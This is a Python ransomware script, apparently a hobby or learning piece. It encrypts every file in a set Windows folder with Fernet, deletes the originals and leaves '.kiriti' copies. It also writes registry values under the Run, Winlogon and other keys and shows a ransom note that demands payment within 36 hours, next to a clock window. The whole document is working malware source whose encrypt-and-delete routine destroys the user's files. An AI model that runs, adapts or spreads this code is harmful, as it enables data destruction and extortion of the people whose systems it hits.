import os
import winreg
import tkinter as tk
import time
from cryptography.fernet import Fernet

# Define the path to the folder
folder_path = r"C:\Users\K\Downloads\localRoot"

# Generate a new encryption key
key = Fernet.generate_key()

# Create a Fernet cipher using the generated key
cipher = Fernet(key)

# Function to encrypt a file
def encrypt_file(file_path):
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted_data = cipher.encrypt(data)
    with open(file_path + ".kiriti", "wb") as file:
        file.write(encrypted_data)
    os.remove(file_path)
    print("Encrypted:", file_path)

# Traverse the folder and encrypt files
modified_files = []
for root, dirs, files in os.walk(folder_path):
    for file in files:
        file_path = os.path.join(root, file)
        encrypt_file(file_path)
        modified_files.append(file_path)

# Save the encryption key to a file
with open("encryption_key.key", "wb") as file:
    file.write(key)

print("\nEncryption complete.")
print("Encryption type: Fernet")
print("Modified files:")
for file_path in modified_files:
    print(file_path)

# Specify the registry hives and value data
registry_entries = [
    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "MyEntry", "KIRITI"),
    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "MyEntry", "KIRITI"),
    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "MyEntry", "KIRITI"),
    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "MyEntry", "KIRITI"),
    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies", "MyEntry", "KIRITI"),
    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies", "MyEntry", "KIRITI"),
    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings", "MyEntry", "KIRITI"),
    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings", "MyEntry", "KIRITI"),
]

# Function to create a registry entry
def create_registry_entry(hive, key_path, value_name, value_data):
    try:
        key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
    except FileNotFoundError:
        # Handle the case when the key does not exist
        key = winreg.CreateKey(hive, key_path)

    # Set the registry value
    winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)

    # Close the registry key
    winreg.CloseKey(key)

# Create the registry entries
for hive, key_path, value_name, value_data in registry_entries:
    create_registry_entry(hive, key_path, value_name, value_data)

print("Registry entries created successfully.")

# Specify the file path
file_path = "new_file.txt"

# Define the text content
text_content = """Oops, your files have been encrypted
Pay up and you will be free
You have 36 hours to do so and the countdown starts now"""

# Create the file and write the text content
with open(file_path, "w") as file:
    file.write(text_content)

# Open the file
os.startfile(file_path)

# Create the main window
window = tk.Tk()
window.title("Clock")

# Create a label for the clock
clock_label = tk.Label(window, font=("Arial", 24))
clock_label.pack(padx=20, pady=20)

# Create a text widget for the text file content
text_widget = tk.Text(window, font=("Arial", 12), bg="red", fg="white")
text_widget.pack(padx=20, pady=20)

# Load the text content into the text widget
with open(file_path, "r") as file:
    text_content = file.read()
    text_widget.insert(tk.END, text_content)

# Function to update the clock display
def update_clock():
    current_time = time.strftime("%H:%M:%S")
    clock_label.config(text=current_time)
    clock_label.after(1000, update_clock)  # Update every second

# Start updating the clock display
update_clock()

# Run the main event loop
window.mainloop()
